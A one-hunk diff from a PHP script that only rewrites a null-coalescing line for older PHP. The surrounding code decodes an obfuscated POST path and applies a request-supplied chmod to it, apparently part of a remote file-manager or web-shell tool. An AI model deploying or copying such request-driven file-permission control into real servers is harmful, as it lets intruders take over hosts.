@@ -461,7 +461,7 @@ else if ($ne == 'chmod') {
 	}
 }
 else if ($ne == 'chmod_folder' && isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf'])) {
-	$mod = $_POST['mod'] ?? $_GET['mod'];
+	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
 	$rootPath = realpath(deshifrele(urldecode($_POST['zf'])));
 	if ($mod && $rootPath) {
 		$status = chmod($rootPath, octdec($mod));
